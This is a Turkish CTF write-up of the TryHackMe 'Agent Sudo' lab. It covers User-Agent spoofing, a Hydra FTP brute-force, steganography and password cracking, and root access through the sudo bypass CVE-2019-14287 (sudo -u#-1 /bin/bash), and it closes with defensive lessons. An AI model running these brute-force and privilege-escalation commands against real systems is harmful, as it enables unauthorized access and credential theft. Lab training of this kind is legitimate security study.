# 🕵️‍♂️ TryHackMe - Agent Sudo CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Agent_Sudo-red.svg?style=flat-square&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg?style=flat-square)
![Category](https://img.shields.io/badge/Category-Steganography_%7C_Brute--Force_%7C_CVE--2019--14287-blue.svg?style=flat-square)

Bu doküman, TryHackMe platformundaki **Agent Sudo** makinesinin User-Agent manipülasyonu, FTP kaba kuvvet saldırısı, steganografi (`binwalk`, `john`, `steghide`), OSINT ve `sudo` zafiyeti (**CVE-2019-14287**) üzerinden yetki yükseltme adımlarını içermektedir.

**Platform:** TryHackMe  
**Oda:** Agent Sudo ([tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf))  
**Zorluk:** Kolay (Easy)  
**Kategori:** Web / FTP Brute-Force / Steganography / Linux Privilege Escalation  
**Hedef IP:** `10.114.147.122`

---

## 📑 İçindekiler

1. [Keşif & Port Taraması (Reconnaissance)](#1-keşif--port-taraması-reconnaissance)
2. [Web Keşfi & User-Agent Manipülasyonu (Port 80)](#2-web-keşfi--user-agent-manipülasyonu-port-80)
3. [Hydra ile FTP Parola Kırma (Port 21)](#3-hydra-ile-ftp-parola-kırma-port-21)
4. [Dosya Analizi & Steganografi (Binwalk, John, Steghide)](#4-dosya-analizi--steganografi-binwalk-john-steghide)
5. [SSH Erişimi, User Flag & Görsel OSINT](#5-ssh-erişimi-user-flag--görsel-osint)
6. [Yetki Yükseltme (CVE-2019-14287) & Root Flag](#6-yetki-yükseltme-cve-2019-14287--root-flag)
7. [Özet Tablo & Çıkarımlar](#7-özet-tablo--çıkarımlar)
8. [Kaynaklar](#8-kaynaklar)

---

## 1. Keşif & Port Taraması (Reconnaissance)

Hedef makinedeki açık portları ve çalışan servis versiyonlarını tespit etmek için `nmap` taraması yapıldı:

```bash
nmap -sC -sV 10.114.147.122
```

**Açık Portlar (Toplam 3 Port):**
* `21/tcp` — **open** (FTP - vsftpd)
* `22/tcp` — **open** (SSH - OpenSSH)
* `80/tcp` — **open** (HTTP - Apache Web Sunucusu)

---

## 2. Web Keşfi & User-Agent Manipülasyonu (Port 80)

Tarayıcı üzerinden hedef web sayfasına gidildi:

```text
http://10.114.147.122
```

Ana sayfada **Agent R** tarafından bırakılmış bir uyarı mesajı yer almaktadır: ajanların gizli sayfaya erişebilmek için kendi kod adlarını (tek harflik ajan kodunu) HTTP **`User-Agent`** başlığı olarak kullanmaları istenmektedir.

`curl` aracının `-A` (User-Agent) ve `-L` (yönlendirmeleri takip et) parametreleri kullanılarak harfler denendiğinde **`C`** harfinde özel bir yönlendirme ve mesaj yakalandı:

```bash
curl -A "C" -L "http://10.114.147.122"
```

* Sayfa içeriğinden **Agent C**'nin gerçek kullanıcı adının **`chris`** olduğu ve parolasının zayıf olduğu bilgisi elde edildi.

---

## 3. Hydra ile FTP Parola Kırma (Port 21)

Elde edilen `chris` kullanıcı adı ve `rockyou.txt` parola listesi kullanılarak FTP servisine **THC-Hydra** ile sözlük saldırısı düzenlendi:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.114.147.122 ftp
```

**Bulunan FTP Kimlik Bilgileri:**
* **Kullanıcı Adı:** `chris`
* **Parola:** `crystal`

FTP sunucusuna giriş yapılarak içerideki dosyalar indirildi:

```bash
ftp 10.114.147.122
# Kullanıcı: chris | Parola: crystal
```

```ftp
ftp> ls
ftp> mget *
ftp> bye
```

Sunucudan üç adet dosya elde edildi:
* Bir metin dosyası (`To_agentJ.txt`)
* İki görsel dosyası (`cutie.png` ve `cute-alien.jpg` / `cute-alien.png`)

Metin dosyası okunduğunda giriş bilgilerinin sahte görsellerin içerisine gizlendiği öğrenildi.

---

## 4. Dosya Analizi & Steganografi (Binwalk, John, Steghide)

### 4.1. `binwalk` ile Gömülü ZIP Dosyasını Çıkarma

Görsellerin içerisine gömülmüş arşiv veya dosyaları tespit etmek için `binwalk` kullanıldı. `cutie.png` içerisinde gömülü bir ZIP arşivi (`8702.zip`) olduğu görüldü ve `-e` parametresiyle dışarı çıkarıldı:

```bash
binwalk -e cutie.png
```

### 4.2. `zip2john` & `john` ile ZIP Parolasını Kırma

Çıkarılan `_cutie.png.extracted` dizinindeki şifreli `8702.zip` dosyasının parola özetini (hash) almak için `zip2john` çalıştırıldı:

```bash
cd _cutie.png.extracted
zip2john 8702.zip > zip.hash
```

Ardından **John the Ripper** ve `rockyou.txt` kullanılarak ZIP parolası kırıldı:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

* **ZIP Parolası:** `alien`

### 4.3. Arşivin Açılması & Base64 Çözümleme

Elde edilen `alien` parolası ile arşiv `7z` kullanılarak çıkartıldı ve içerisindeki `To_agentR.txt` dosyası okundu:

```bash
7z e 8702.zip
cat To_agentR.txt
```

Metin içerisinde `'QXJlYTUx'` şeklinde kodlanmış bir ifade yer almaktadır. **CyberChef** (From Base64) veya terminal üzerinden çözümlendiğinde gizli anahtar kelime elde edildi:

```bash
echo "QXJlYTUx" | base64 -d
# Çıktı: Area51
```

* **Bulunan Kod / Passphrase:** `Area51`

### 4.4. `steghide` ile İkinci Görselden Veri Çıkarma

`binwalk` ile doğrudan veri alınamayan diğer görsel dosyasında (`cute-alien.jpg` / `cute-alien.png`), `Area51` parolası **Steghide** passphrase değeri olarak kullanıldı:

```bash
steghide info cute-alien.jpg
# Passphrase: Area51

steghide extract -sf cute-alien.jpg
# Passphrase: Area51 -> message.txt dosyası dışarı çıkarıldı
```

Çıkarılan `message.txt` dosyası okunduğunda diğer ajanın sistem giriş bilgileri öğrenildi:

```bash
cat message.txt
```

* **Kullanıcı Adı:** `james`
* **SSH Parolası:** `hackerrules!`

---

## 5. SSH Erişimi, User Flag & Görsel OSINT

Elde edilen kimlik bilgileri ile SSH üzerinden hedef makineye giriş yapıldı:

```bash
ssh james@10.114.147.122
# Parola: hackerrules!
```

Dizindeki dosyalar listelendi:

```bash
ls -la
cat user_flag.txt
```

* `user_flag.txt` okunarak **User Flag** elde edildi.
* Dizinde ayrıca `Alien_autopsy.jpg` adlı bir görsel bulundu. Bu görsel yerel makineye alınıp (`scp james@10.114.147.122:Alien_autopsy.jpg .`) tersine görsel arama (Reverse Image Search) ile araştırıldığında olayın **`Roswell alien autopsy`** haberi olduğu tespit edildi.

---

## 6. Yetki Yükseltme (CVE-2019-14287) & Root Flag

Sistemdeki son bayrağı okumak için `root` yetkisine ihtiyaç duyulduğundan `james` kullanıcısının `sudo` izinleri kontrol edildi:

```bash
sudo -l
```

**Çıktı Analizi:**

```text
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Bu kural, `james` kullanıcısının `root` dışındaki tüm kullanıcılar adına `/bin/bash` çalıştırabileceğini belirtmektedir. Bu yapılandırma araştırıldığında Sudo güvenlik atlatma zafiyeti olan **CVE-2019-14287** karşımıza çıkmaktadır.

### Zafiyetin Mantığı ve İstismarı
Eski `sudo` sürümlerinde `(ALL, !root)` kısıtlaması tanımlandığında, kullanıcı kimliği (UID) olarak `-1` veya `4294967295` verildiğinde `sudo` bu değeri `0` (`root` UID'si) olarak yorumlamakta ancak `!root` kontrolünü atlamaktadır:

```bash
sudo -u#-1 /bin/bash
```

Komut çalıştırıldığında doğrudan `root` kabuğu (shell) elde edildi ve `/root/root.txt` okundu:

```bash
whoami
# root

cat /root/root.txt
```

* `/root/root.txt` içerisinden **Root Flag** ve **Agent R**'nin gerçek adı öğrenilerek oda tamamlandı.

---

## 7. Özet Tablo & Çıkarımlar

| Aşama | Bulgular / Kullanılan Yöntem | Sonuç |
| :--- | :--- | :--- |
| **Port Taraması** | `nmap -sC -sV 10.114.147.122` | `21/ftp`, `22/ssh`, `80/http` (3 açık port) |
| **User-Agent Bypass** | `curl -A "C" -L "http://10.114.147.122"` | Agent C kullanıcı adı: `chris` |
| **FTP Brute-Force** | `hydra -l chris -P rockyou.txt 10.114.147.122 ftp` | FTP parolası: `crystal` |
| **Binwalk & John** | `binwalk -e cutie.png` -> `zip2john` & `john` | ZIP parolası: `alien` -> Base64: `Area51` |
| **Steghide** | `steghide extract -sf cute-alien.jpg` (`Area51`) | SSH bilgileri: `james` : `hackerrules!` |
| **OSINT** | `Alien_autopsy.jpg` tersine görsel arama | `Roswell alien autopsy` |
| **Privilege Escalation** | `sudo -l` -> `(ALL, !root) /bin/bash` (**CVE-2019-14287**) | `sudo -u#-1 /bin/bash` ile `root` erişimi |

### Güvenlik Çıkarımları
1. **HTTP Başlıklarına Güvenmeme:** `User-Agent` gibi istemci tarafından kolayca değiştirilebilen HTTP başlıkları erişim kontrolü veya kimlik doğrulama amacıyla kullanılmamalıdır.
2. **Steganografi (Security through Obscurity):** Hassas parolaları görsel veya arşiv dosyalarının içerisine gizlemek gerçek bir şifreleme/koruma sağlamaz.
3. **Sudo Güncellemeleri ve Kural Yapılandırması:** `(ALL, !root)` gibi istisna tabanlı `sudoers` kuralları zafiyet barındırabileceğinden (`CVE-2019-14287`), yalnızca açıkça izin verilen hedef kullanıcılar tanımlanmalı ve sistem paketleri güncel tutulmalıdır.

---

## 8. Kaynaklar

- [TryHackMe — Agent Sudo Odası](https://tryhackme.com/room/agentsudoctf)
- [NVD — CVE-2019-14287 Detail](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [Exploit-DB — Sudo 1.8.27 Security Bypass (CVE-2019-14287)](https://www.exploit-db.com/exploits/47502)
